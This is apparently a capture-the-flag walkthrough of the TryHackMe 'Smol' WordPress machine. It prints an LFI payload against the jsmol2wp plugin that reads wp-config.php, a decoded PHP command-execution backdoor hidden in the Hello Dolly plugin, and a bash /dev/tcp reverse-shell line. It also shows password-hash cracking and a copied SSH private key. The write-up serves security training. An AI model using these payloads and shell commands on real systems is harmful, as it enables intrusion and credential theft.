- - - 
created : 20-07-2025 

Tags : #medium #detailed 
- - - 
# Objective

At the heart of **Smol** is a WordPress website, a common target due to its extensive plugin ecosystem. The machine showcases a publicly known vulnerable plugin, highlighting the risks of neglecting software updates and security patches. Enhancing the learning experience, Smol introduces a backdoored plugin, emphasizing the significance of meticulous code inspection before integrating third-party components.

Quick Tips: Do you know that on computers without GPU like the AttackBox, **John The Ripper** is faster than **Hashcat**?
# Recon

## Rustscan/Nmap

First we add the room on /etc/hosts file then we use [Rustscan](../../3%20-%20Tags/Hacking%20Tools/Rustscan.md) that will pass the result to [Nmap](../../3%20-%20Tags/Hacking%20Tools/Nmap.md) :

```
┌──(mdn0x㉿mdn0xonKali)-[~]
└─$ rustscan -a smol.thm -- -A 
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog         :
: https://github.com/RustScan/RustScan :
 --------------------------------------
0day was here ♥

[~] The config file is expected to be at "/home/mdn0x/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 10.10.233.122:22
Open 10.10.233.122:80

PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 44:5f:26:67:4b:4a:91:9b:59:7a:95:59:c8:4c:2e:04 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDMc4hLykriw3nBOsKHJK1Y6eauB8OllfLLlztbB4tu4c9cO8qyOXSfZaCcb92uq/Y3u02PPHWq2yXOLPler1AFGVhuSfIpokEnT2jgQzKL63uJMZtoFzL3RW8DAzunrHhi/nQqo8sw7wDCiIN9s4PDrAXmP6YXQ5ekK30om9kd5jHG6xJ+/gIThU4ODr/pHAqr28bSpuHQdgphSjmeShDMg8wu8Kk/B0bL2oEvVxaNNWYWc1qHzdgjV5HPtq6z3MEsLYzSiwxcjDJ+EnL564tJqej6R69mjII1uHStkrmewzpiYTBRdgi9A3Yb+x8NxervECFhUR2MoR1zD+0UJbRA2v1LQaGg9oYnYXNq3Lc5c4aXz638wAUtLtw2SwTvPxDrlCmDVtUhQFDhyFOu9bSmPY0oGH5To8niazWcTsCZlx2tpQLhF/gS3jP/fVw+H6Eyz/yge3RYeyTv3ehV6vXHAGuQLvkqhT6QS21PLzvM7bCqmo1YIqHfT2DLi7jZxdk=
|   256 0a:4b:b9:b1:77:d2:48:79:fc:2f:8a:3d:64:3a:ad:94 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBJNL/iO8JI5DrcvPDFlmqtX/lzemir7W+WegC7hpoYpkPES6q+0/p4B2CgDD0Xr1AgUmLkUhe2+mIJ9odtlWW30=
|   256 d3:3b:97:ea:54:bc:41:4d:03:39:f6:8f:ad:b6:a0:fb (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFG/Wi4PUTjReEdk2K4aFMi8WzesipJ0bp0iI0FM8AfE
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.41 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
```

So we have http server on 80 and ssh on 22 .
# Enumeration
## SSH (22)

First thing we do is checking if password is allowed on access on [SSH](../../3%20-%20Tags/Hacking%20Concepts/SSH.md) :

```
┌──(mdn0x㉿mdn0xonKali)-[~]
└─$ ssh root@smol.thm            
The authenticity of host 'smol.thm (10.10.233.122)' can't be established.
ED25519 key fingerprint is SHA256:Ndgax/DOZA6JS00F3afY6VbwjVhV2fg5OAMP9TqPAOs.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'smol.thm' (ED25519) to the list of known hosts.
root@smol.thm: Permission denied (publickey).
```

Not enabled, it would ask for a password and it don't so we need a **id_key** to access.
## HTTP (80)

### Dirsearch

We search for hidden directories with [Dirsearch](../../3%20-%20Tags/Hacking%20Tools/Dirsearch.md) :

```
┌──(mdn0x㉿mdn0xonKali)-[~/THM/CHALLENGES/Easy/Smol]
└─$ dirsearch -u http://smol.thm
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/mdn0x/THM/CHALLENGES/Easy/Smol/reports/http_smol.thm/_25-07-20_21-21-21.txt

Target: http://smol.thm/

[21:21:21] Starting: 

21:22:08] 301 -    0B  - /index.php/login/  ->  http://www.smol.thm/index.php/login/
[21:22:11] 200 -    7KB - /license.txt   
[21:22:27] 200 -    3KB - /readme.html                                      
[21:22:49] 301 -  307B  - /wp-admin  ->  http://smol.thm/wp-admin/          
[21:22:49] 400 -    1B  - /wp-admin/admin-ajax.php                          
[21:22:49] 200 -    0B  - /wp-config.php
[21:22:49] 302 -    0B  - /wp-admin/  ->  http://www.smol.thm/wp-login.php?redirect_to=http%3A%2F%2Fsmol.thm%2Fwp-admin%2F&reauth=1
[21:22:49] 409 -    3KB - /wp-admin/setup-config.php                        
[21:22:49] 200 -  500B  - /wp-admin/install.php                             
[21:22:49] 200 -    0B  - /wp-content/                                      
[21:22:49] 301 -  309B  - /wp-content  ->  http://smol.thm/wp-content/      
[21:22:49] 500 -    0B  - /wp-content/plugins/hello.php                     w
[21:22:50] 200 -   84B  - /wp-content/plugins/akismet/akismet.php           
[21:22:50] 200 -  528B  - /wp-content/uploads/                              
[21:22:50] 200 -  410B  - /wp-content/upgrade/                              
[21:22:50] 301 -  310B  - /wp-includes  ->  http://smol.thm/wp-includes/    
[21:22:50] 200 -    0B  - /wp-includes/rss-functions.php                    
[21:22:50] 200 -    0B  - /wp-cron.php                                      
[21:22:50] 302 -    0B  - /wp-signup.php  ->  http://www.smol.thm/wp-login.php?action=register
[21:22:50] 200 -    2KB - /wp-login.php
[21:22:50] 200 -    4KB - /wp-includes/                                     
[21:22:51] 405 -   42B  - /xmlrpc.php                          

```

Looks like we have a [Wordpress](../../3%20-%20Tags/Hacking%20Concepts/Wordpress.md) [Server](../../3%20-%20Tags/Hacking%20Concepts/Server.md), we have to update also the /etc/hosts to catch www.smol.thm :

![Pasted image 20250720213518.png](../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250720213518.png)

There's username [Enumeration](../../3%20-%20Tags/Hacking%20Concepts/Enumeration.md) .
### WPScan 

We can use [WPScan](../../3%20-%20Tags/Hacking%20Tools/WPScan.md) which is a [Wordpress](../../3%20-%20Tags/Hacking%20Concepts/Wordpress.md) scanner for vulnerabilities, we can use it without a API token or make a free account on their website to get an API for better results :

```
┌──(mdn0x㉿mdn0xonKali)-[~/THM/CHALLENGES/Easy/Smol]
└─$ wpscan --url http://www.smol.thm                                                    
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.28
                               
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[i] Updating the Database ...
[i] Update completed.


+] WordPress version 6.7.1 identified (Outdated, released on 2024-11-21).
 | Found By: Rss Generator (Passive Detection)
 |  - http://www.smol.thm/index.php/feed/, <generator>https://wordpress.org/?v=6.7.1</generator>
 |  - http://www.smol.thm/index.php/comments/feed/, <generator>https://wordpress.org/?v=6.7.1</


[+] WordPress theme in use: twentytwentythree
 | Location: http://www.smol.thm/wp-content/themes/twentytwentythree/
 | Last Updated: 2024-11-13T00:00:00.000Z
 | Readme: http://www.smol.thm/wp-content/themes/twentytwentythree/readme.txt
 | [!] The version is out of date, the latest version is 1.6
 | [!] Directory listing is enabled
 | Style URL: http://www.smol.thm/wp-content/themes/twentytwentythree/style.css
 | Style Name: Twenty Twenty-Three
 | Style URI: https://wordpress.org/themes/twentytwentythree
 | Description: Twenty Twenty-Three is designed to take advantage of the new design tools introduced in WordPress 6....
 | Author: the WordPress team
 | Author URI: https://wordpress.org

+] jsmol2wp
 | Location: http://www.smol.thm/wp-content/plugins/jsmol2wp/
 | Latest Version: 1.07 (up to date)
 | Last Updated: 2018-03-09T10:28:00.000Z
 |
 | Found By: Urls In Homepage (Passive Detection)

```

The API version actually finds 2 vuln in jsmol2wp . (XSS -SSRF), and we also get username enumeration done for us on the login page .
# Exploit

If we search for JSmol2WP SSRF we find info about [CVE-2018-20463](../../3%20-%20Tags/CVEs/CVE-2018-20463.md) :

![Pasted image 20250720215506.png](../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250720215506.png)

We can copy this piece of code where it specify the path and paste it in the URL to see if we have something :

`http://www.smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=getRawDataFromDatabase&query=php://filter/resource=../../../../wp-config.php` :

![Pasted image 20250721131646.png](../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250721131646.png)

kbLSF2Vop#lw3rjDZ629*Z%G : wpuser.  

We have confirmed there's SSRF .

## First Access

We can hope in password reusing and try to login :

![Pasted image 20250721132055.png](../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250721132055.png)

Boom. Now we find something :

![Pasted image 20250721132244.png](../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250721132244.png)

Let's search about 'Holly Dolly' plugin :

![Pasted image 20250721132629.png](../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250721132629.png)

So we know the name of the file .

We can try [Escaping](../../3%20-%20Tags/Hacking%20Concepts/Escaping.md) to the file :

![Pasted image 20250721133317.png](../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250721133317.png)

And we have the same code, but we can spot the difference from original project in the eval function in [Base64](../../3%20-%20Tags/Hacking%20Concepts/Base64.md), so we decode it :

```
┌──(mdn0x㉿mdn0xonKali)-[~/THM/CHALLENGES/Easy/Smol]
└─$ echo 'CiBpZiAoaXNzZXQoJF9HRVRbIlwxNDNcMTU1XHg2NCJdKSkgeyBzeXN0ZW0oJF9HRVRbIlwxNDNceDZkXDE0NCJdKTsgfSA=' | base64 -d 

 if (isset($_GET["\143\155\x64"])) { system($_GET["\143\x6d\144"]); }     
```

So it's a system GET request, and it's only for admin users in the admin portal .

If we log in again wit **wpuser** we are able to execute commands :

![Pasted image 20250721134114.png](../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250721134114.png)

***RCE Backdoor***

## Reverse Shell

### Reverse Shell Generator
https://www.revshells.com/

```
sh -i >& /dev/tcp/10.8.162.183/1337 0>&1
```

Now we create the file and open a basic [Python](../../3%20-%20Tags/Programming%20Languages/Python.md) [Server](../../3%20-%20Tags/Hacking%20Concepts/Server.md) :

```
┌──(mdn0x㉿mdn0xonKali)-[~/THM/CHALLENGES/Easy/Smol]
└─$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

Now we download it from our target :

![Pasted image 20250721134847.png](../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250721134847.png)

We make it executable with `chmod 777 sell.sh` and then open our listener with [Netcat](../../3%20-%20Tags/Hacking%20Tools/Netcat.md) and execute :

![Pasted image 20250721135215.png](../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250721135215.png)

And we have it .

### Shell Stabilization

Now we can do [Shell Stabilization](../../3%20-%20Tags/Hacking%20Concepts/Shell%20Stabilization.md) :

```
$ clear
TERM environment variable not set.
$ python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@smol:/var$ export TERM=xterm
export TERM=xterm
www-data@smol:/var$ ^Z
zsh: suspended  nc -lvnp 1337
                                                                                                                              
┌──(mdn0x㉿mdn0xonKali)-[~/THM/CHALLENGES/Easy/Smol]
└─$ stty raw -echo;fg
[1]  + continued  nc -lvnp 1337
                               reset
www-data@smol:/var$ ls -la
```

Now we have a stable shell .
# Lateral Movement - Privilege Escalation

## Wordpress Database Dump

```
www-data@smol:/$ cd home
www-data@smol:/home$ ls
diego  gege  think  xavi
www-data@smol:/home$ 
```

We have 4 users, we can't read anything.

We go to /opt :

```
www-data@smol:/$ cd opt
www-data@smol:/opt$ ls
wp_backup.sql
```

We have the password for the database : kbLSF2Vop#lw3rjDZ629*Z%G : wpuser.  

We can use [MySQL](../../3%20-%20Tags/Hacking%20Tools/MySQL.md) to try to access it and read something :

```
www-data@smol:/opt$ ls
wp_backup.sql
www-data@smol:/opt$ mysql -u wpuser -p
Enter password: 
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 178
Server version: 8.0.36-0ubuntu0.20.04.1 (Ubuntu)

Copyright (c) 2000, 2024, Oracle and/or its affiliates.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| sys                |
| wordpress          |
+--------------------+
5 rows in set (0.00 sec)

mysql> use wordpress;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql> show tables;
+---------------------------+
| Tables_in_wordpress       |
+---------------------------+
| wp_bp_activity            |
| wp_bp_activity_meta       |
| wp_bp_invitations         |
| wp_bp_messages_messages   |
| wp_bp_messages_meta       |
| wp_bp_messages_notices    |
| wp_bp_messages_recipients |
| wp_bp_notifications       |
| wp_bp_notifications_meta  |
| wp_bp_optouts             |
| wp_bp_xprofile_data       |
| wp_bp_xprofile_fields     |
| wp_bp_xprofile_groups     |
| wp_bp_xprofile_meta       |
| wp_commentmeta            |
| wp_comments               |
| wp_links                  |
| wp_options                |
| wp_postmeta               |
| wp_posts                  |
| wp_signups                |
| wp_term_relationships     |
| wp_term_taxonomy          |
| wp_termmeta               |
| wp_terms                  |
| wp_usermeta               |
| wp_users                  |
| wp_wysija_campaign        |
| wp_wysija_campaign_list   |
| wp_wysija_custom_field    |
| wp_wysija_email           |
| wp_wysija_email_user_stat |
| wp_wysija_email_user_url  |
| wp_wysija_form            |
| wp_wysija_list            |
| wp_wysija_queue           |
| wp_wysija_url             |
| wp_wysija_url_mail        |
| wp_wysija_user            |
| wp_wysija_user_field      |
| wp_wysija_user_history    |
| wp_wysija_user_list       |
+---------------------------+
42 rows in set (0.00 sec)

mysql> select * from wp_users;
+----+------------+------------------------------------+---------------+--------------------+---------------------+---------------------+---------------------+-------------+------------------------+
| ID | user_login | user_pass                          | user_nicename | user_email         | user_url            | user_registered     | user_activation_key | user_status | display_name           |
+----+------------+------------------------------------+---------------+--------------------+---------------------+---------------------+---------------------+-------------+------------------------+
|  1 | admin      | $P$BH.CF15fzRj4li7nR19CHzZhPmhKdX. | admin         | admin@smol.thm     | http://www.smol.thm | 2023-08-16 06:58:30 |                     |           0 | admin                  |
|  2 | wpuser     | $P$BfZjtJpXL9gBwzNjLMTnTvBVh2Z1/E. | wp            | wp@smol.thm        | http://smol.thm     | 2023-08-16 11:04:07 |                     |           0 | wordpress user         |
|  3 | think      | $P$BOb8/koi4nrmSPW85f5KzM5M/k2n0d/ | think         | josemlwdf@smol.thm | http://smol.thm     | 2023-08-16 15:01:02 |                     |           0 | Jose Mario Llado Marti |
|  4 | gege       | $P$B1UHruCd/9bGD.TtVZULlxFrTsb3PX1 | gege          | gege@smol.thm      | http://smol.thm     | 2023-08-17 20:18:50 |                     |           0 | gege                   |
|  5 | diego      | $P$BWFBcbXdzGrsjnbc54Dr3Erff4JPwv1 | diego         | diego@local        | http://smol.thm     | 2023-08-17 20:19:15 |                     |           0 | diego                  |
|  6 | xavi       | $P$BB4zz2JEnM2H3WE2RHs3q18.1pvcql1 | xavi          | xavi@smol.thm      | http://smol.thm     | 2023-08-17 20:20:01 |                     |           0 | xavi                   |
+----+------------+------------------------------------+---------------+--------------------+---------------------+---------------------+---------------------+-------------+------------------------+
6 rows in set (0.00 sec)
```

We have users and hashes so we create a list and try to crack them for [Lateral Movement](../../3%20-%20Tags/Hacking%20Concepts/Lateral%20Movement.md) :

```
$P$BH.CF15fzRj4li7nR19CHzZhPmhKdX.
$P$BfZjtJpXL9gBwzNjLMTnTvBVh2Z1/E.
$P$BOb8/koi4nrmSPW85f5KzM5M/k2n0d/
$P$B1UHruCd/9bGD.TtVZULlxFrTsb3PX1
$P$BWFBcbXdzGrsjnbc54Dr3Erff4JPwv1
$P$BB4zz2JEnM2H3WE2RHs3q18.1pvcql1
```
### Hashcat

We can use [Hashcat](../../3%20-%20Tags/Hacking%20Tools/Hashcat.md) to find the passwords :

```
┌──(mdn0x㉿mdn0xonKali)-[~/THM/CHALLENGES/Easy/Smol]
└─$ hashcat hashes.txt /usr/share/wordlists/rockyou.txt 
hashcat (v6.2.6) starting in autodetect mode
```

Quick Tips: Do you know that on computers without GPU like the AttackBox, **John The Ripper** is faster than **Hashcat**?     The room says it.
### JohnTheRipper

We will use [JohnTheRipper](../../3%20-%20Tags/Hacking%20Tools/JohnTheRipper.md) to gain speed :

```
┌──(mdn0x㉿mdn0xonKali)-[~/THM/CHALLENGES/Easy/Smol]
└─$ john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt  
Using default input encoding: UTF-8
Loaded 6 password hashes with 6 different salts (phpass [phpass ($P$ or $H$) 256/256 AVX2 8x3])
Cost 1 (iteration count) is 8192 for all loaded hashes
Will run 12 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
sandiegocalifornia (diego)   
```
## First User Access

We can `su diego` with the cracked password and check form permissions :

```
www-data@smol:/home$ su diego
Password: sandiegocalifornia
diego@smol:/home$ ls
diego  gege  think  xavi
diego@smol:/home$ cd diego
diego@smol:~$ ls
user.txt
diego@smol:~$ cat user.txt
45edaec653ff9ee06236b7ce72b86963
```

Now we can have access to `think` .ssh directory :

```
iego@smol:~$ cd ..
diego@smol:/home$ cd think
diego@smol:/home/think$ ls
diego@smol:/home/think$ ls -la
total 32
drwxr-x--- 5 think internal 4096 Jan 12  2024 .
drwxr-xr-x 6 root  root     4096 Aug 16  2023 ..
lrwxrwxrwx 1 root  root        9 Jun 21  2023 .bash_history -> /dev/null
-rw-r--r-- 1 think think     220 Jun  2  2023 .bash_logout
-rw-r--r-- 1 think think    3771 Jun  2  2023 .bashrc
drwx------ 2 think think    4096 Jan 12  2024 .cache
drwx------ 3 think think    4096 Aug 18  2023 .gnupg
-rw-r--r-- 1 think think     807 Jun  2  2023 .profile
drwxr-xr-x 2 think think    4096 Jun 21  2023 .ssh
lrwxrwxrwx 1 root  root        9 Aug 18  2023 .viminfo -> /dev/null
diego@smol:/home/think$ cd .ssh
diego@smol:/home/think/.ssh$ ls
authorized_keys  id_rsa  id_rsa.pub

diego@smol:/home/think/.ssh$ cat id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEAxGtoQjY5NUymuD+3b0xzEYIhdBbsnicrrnvkMjOgdbp8xYKrfOgM
ehrkrEXjcqmrFvZzp0hnVnbaCyUV8vDrywsrEivK7d5IDefssH/RqRinOY3FEYE+ekzKoH
+S6+jNEKedMH7DamLsXxsAG5b/Avm+FpWmvN1yS5sTeCeYU0wsHMP+cfM1cYcDkDU6HmiC
A2G4D5+uPluSH13TS12JpFyU3EjHQvV6evERecriHSfV0PxMrrwJEyOwSPYA2c7RlYh+tb
bniQRVAGE0Jato7kqAJOKZIuXHEIKhBnFOIt5J5sp6l/QfXxZYRMBaiuyNttOY1byNwj6/
EEyQe1YM5chhtmJm/RWog8U6DZf8BgB2KoVN7k11VG74+cmFMbGP6xn1mQG6i2u3H6WcY1
LAc0J1bhypGsPPcE06934s9jrKiN9Xk9BG7HCnDhY2A6bC6biE4UqfU3ikNQZMXwCvF8vY
HD4zdOgaUM8Pqi90WCGEcGPtTfW/dPe4+XoqZmcVAAAFiK47j+auO4/mAAAAB3NzaC1yc2
EAAAGBAMRraEI2OTVMprg/t29McxGCIXQW7J4nK6575DIzoHW6fMWCq3zoDHoa5KxF43Kp                                                        
qxb2c6dIZ1Z22gslFfLw68sLKxIryu3eSA3n7LB/0akYpzmNxRGBPnpMyqB/kuvozRCnnT                                                        
B+w2pi7F8bABuW/wL5vhaVprzdckubE3gnmFNMLBzD/nHzNXGHA5A1Oh5oggNhuA+frj5b
kh9d00tdiaRclNxIx0L1enrxEXnK4h0n1dD8TK68CRMjsEj2ANnO0ZWIfrW254kEVQBhNC
WraO5KgCTimSLlxxCCoQZxTiLeSebKepf0H18WWETAWorsjbbTmNW8jcI+vxBMkHtWDOXI
YbZiZv0VqIPFOg2X/AYAdiqFTe5NdVRu+PnJhTGxj+sZ9ZkBuotrtx+lnGNSwHNCdW4cqR
rDz3BNOvd+LPY6yojfV5PQRuxwpw4WNgOmwum4hOFKn1N4pDUGTF8ArxfL2Bw+M3ToGlDP
D6ovdFghhHBj7U31v3T3uPl6KmZnFQAAAAMBAAEAAAGBAIxuXnQ4YF6DFw/UPkoM1phF+b
UOTs4kI070tQpPbwG8+0gbTJBZN9J1N9kTfrKULAaW3clUMs3W273sHe074tmgeoLbXJME
wW9vygHG4ReM0MKNYcBKL2kxTg3CKEESiMrHi9MITp7ZazX0D/ep1VlDRWzQQg32Jal4jk
rxxC6J32ARoPHHeQZaCWopJAxpm8rfKsHA4MsknSxf4JmZnrcsmiGExzJQX+lWQbBaJZ/C
w1RPjmO/fJ16fqcreyA+hMeAS0Vd6rUqRkZcY/0/aA3zGUgXaaeiKtscjKJqeXZ66/NiYD
6XhW/O3/uBwepTV/ckwzdDYD3v23YuJp1wUOPG/7iTYdQXP1FSHYQMd/C+37gyURlZJqZg
e8ShcdgU4htakbSA8K2pYwaSnpxsp/LHk9adQi4bB0i8bCTX8HQqzU8zgaO9ewjLpGBwf4
Y0qNNo8wyTluGrKf72vDbajti9RwuO5wXhdi+RNhktuv6B4aGLTmDpNUk5UALknD2qAQAA
AMBU+E8sqbf2oVmb6tyPu6Pw/Srpk5caQw8Dn5RvG8VcdPsdCSc29Z+frcDkWN2OqL+b0B
zbOhGp/YwPhJi098nujXEpSied8JCKO0R9wU/luWKeorvIQlpaKA5TDZaztrFqBkE8FFEQ
gKLOtX3EX2P11ZB9UX/nD9c30jEW7NrVcrC0qmts4HSpr1rggIm+JIom8xJQWuVK42Dmun
lJqND0YfSgN5pqY4hNeqWIz2EnrFxfMaSzUFacK8WLQXVP2x8AAADBAPkcG1ZU4dRIwlXE
XX060DsJ9omNYPHOXVlPmOov7Ull6TOdv1kaUuCszf2dhl1A/BBkGPQDP5hKrOdrh8vcRR
A+Eog/y0lw6CDUDfwGQrqDKRxVVUcNbGNhjgnxRRg2ODEOK9G8GsJuRYihTZp0LniM2fHd
jAoSAEuXfS7+8zGZ9k9VDL8jaNNM+BX+DZPJs2FxO5MHu7SO/yU9wKf/zsuu5KlkYGFgLV
Ifa4X2anF1HTJJVfYWUBWAPPsKSfX1UQAAAMEAydo2UnBQhJUia3ux2LgTDe4FMldwZ+yy
PiFf+EnK994HuAkW2l3R36PN+BoOua7g1g1GHveMfB/nHh4zEB7rhYLFuDyZ//8IzuTaTN
7kGcF7yOYCd7oRmTQLUZeGz7WBr3ydmCPPLDJe7Tj94roX8tgwMO5WCuWHym6Os8z0NKKR
u742mQ/UfeT6NnCJWHTorNpJO1fOexq1kmFKCMncIINnk8ZF1BBRQZtfjMvJ44sj9Oi4aE
81DXo7MfGm0bSFAAAAEnRoaW5rQHVidW50dXNlcnZlcg==
-----END OPENSSH PRIVATE KEY-----

```

So we have a private key for [SSH](../../3%20-%20Tags/Hacking%20Concepts/SSH.md) . Let's copy it in a file :

```
┌──(mdn0x㉿mdn0xonKali)-[~/THM/CHALLENGES/Easy/Smol]
└─$ nano key       
                                                                                                                              
┌──(mdn0x㉿mdn0xonKali)-[~/THM/CHALLENGES/Easy/Smol]
└─$ cat key 
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEAxGtoQjY5NUymuD+3b0xzEYIhdBbsnicrrnvkMjOgdbp8xYKrfOgM
ehrkrEXjcqmrFvZzp0hnVnbaCyUV8vDrywsrEivK7d5IDefs......................
```
## Second User Access (SSH)

We can use the key to access [SSH](../../3%20-%20Tags/Hacking%20Concepts/SSH.md) as `think` user after `chmod 600 key` :

```
┌──(mdn0x㉿mdn0xonKali)-[~/THM/CHALLENGES/Easy/Smol]
└─$ ssh -i key think@smol.thm 
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-156-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Mon 21 Jul 2025 12:30:51 PM UTC

  System load:  0.16              Processes:             141
  Usage of /:   56.9% of 9.75GB   Users logged in:       0
  Memory usage: 17%               IPv4 address for ens5: 10.10.227.75
  Swap usage:   0%


Expanded Security Maintenance for Applications is not enabled.

162 updates can be applied immediately.
125 of these updates are standard security updates.
To see these additional updates run: apt list --upgradable

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

think@smol:/$ id
uid=1000(think) gid=1000(think) groups=1000(think),1004(dev),1005(internal)
```

Boom, now if we check in /etc/pam.d/su file we find we can su to user `gege` without providing a password .
## Third User Access

We can just `su gege`, no password needed as said :

```
think@smol:/$ su gege
gege@smol:/$ cd home/gege
gege@smol:~$ ls
wordpress.old.zip
gege@smol:~$ 

```

We have the old Wordpress in a zip file, we can recover passwords from there, so let's try to unzip it :  `ask for password` (not sql password)

We can bypass this simply hosting a [Python](../../3%20-%20Tags/Programming%20Languages/Python.md) [Server](../../3%20-%20Tags/Hacking%20Concepts/Server.md) and download it to our machine :

```
gege@smol:~$ python3 -m http.server 8080
Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) 
```

Now we download :

```
gege@smol:~$ python3 -m http.server 8080
Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) 
```
## Zip2John

Now we can use [Zip2John](../../3%20-%20Tags/Hacking%20Tools/Zip2John.md) to create the hash and then crack the hash for the zip file with [JohnTheRipper](../../3%20-%20Tags/Hacking%20Tools/JohnTheRipper.md) :

```
┌──(mdn0x㉿mdn0xonKali)-[~/THM/CHALLENGES/Easy/Smol]
└─$ zip2john wordpress.old.zip 

wordpress.old.zip:$pkzip$8*1*1*0*0*24*a31c*c2fb90b3964ce4863c047a66cc23c2468ea4fffe2124c38cb9c91659b31793de138ae891*1*0*0*24*a31c*7722f8032fb202c65e40d0d76a91cdfa948dc7e6857f209a06627320940fa5bcbb2603e6*1*0*0*24*a31c*592448eb70b5198cef005c60d3aeb3d78465376eaa5f465e1c2dd7c890d613102e284c88*1*0*0*24*a320*f87c1c69a82331ca288320268e6c556a6ddc31a03e519747bd7b811b6b837527c82abe0e*1*0*0*24*a320*dc42fd5700a7ab7a3353cc674906dec0d6b997d8d56cc90f1248d684df3382d4d8c3ea45*1*0*0*24*a320*c96021e04f0d8a5ce6f787365277b4c9966e228fe80a3d29bc67d14431ecbab621d9cb77*1*0*0*24*a320*35fe982e604f7d27fedd1406d97fc4e874ea7df806bda1fea74676d3510a698ec6a7a3ac*2*0*26*1a*8c9ae7e6*60ed*6c*0*26*a31c*7106504d46479d273327e56f5e3a9dd835ebf0bf28cc32c4cb9c0f2bb991b7acaaa97c9c3670*$/pkzip$::wordpress.old.zip:wordpress.old/wp-content/plugins/akismet/index.php, wordpress.old/wp-content/index.php, wordpress.old/wp-content/plugins/index.php, wordpress.old/wp-content/themes/index.php, wordpress.old/wp-includes/blocks/spacer/style.min.css, wordpress.old/wp-includes/blocks/spacer/style-rtl.min.css, wordpress.old/wp-includes/blocks/spacer/style.css, wordpress.old/wp-includes/blocks/spacer/style-rtl.css:wordpress.old.zip
NOTE: It is assumed that all files in each archive have the same password.
If that is not the case, the hash may be uncrackable. To avoid this, use
option -o to pick a file at a time.
```
## John The Ripper 

We copy the hash in a file and crack with [JohnTheRipper](../../3%20-%20Tags/Hacking%20Tools/JohnTheRipper.md) :
```
┌──(mdn0x㉿mdn0xonKali)-[~/THM/CHALLENGES/Easy/Smol]
└─$ john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt  

Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 12 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
hero_gege@hotmail.com (wordpress.old.zip)     
1g 0:00:00:00 DONE (2025-07-21 14:55) 1.785g/s 13648Kp/s 13648Kc/s 13648KC/s hesse..heiberg77
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

